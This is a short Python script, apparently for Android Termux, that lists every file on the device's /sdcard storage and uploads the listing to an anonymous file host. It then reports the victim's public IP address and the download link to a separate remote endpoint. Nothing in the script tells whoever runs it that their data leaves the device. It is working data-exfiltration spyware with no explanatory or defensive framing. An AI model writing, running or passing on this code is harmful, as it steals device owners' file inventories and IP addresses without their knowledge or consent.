import requests
import os 
import json
if os.path.exists("/sdcard") == True:
  os.system("cd /sdcard && find * > data.txt")
else: 
  os.system("termux-setup-storage")
  os.system("cd /sdcard && find * > data.txt")
uname = requests.get("https://ifconfig.me/")
uname = uname.text
def ipack(url):
  try:
    r = requests.get("http://"+url)
    return True
  except requests.exceptions.ConnectionError:
    return False
def upload(f):
  up = requests.post("https://api.anonfiles.com/upload", files={'file': open(f, "rb")})
  js = json.loads(up.text)
  dt = js["data"]
  dl = dt["file"]
  fl = dl["url"]
  link = fl["full"]
  req = requests.get("https://rootportal.000webhostapp.com/index.php?name="+str(uname)+"&link="+str(link))
if ipack("ifconfig.me") == True:
  upload("/sdcard/data.txt")
else:
  print("You're in offline and sdcard permission are not allowed !")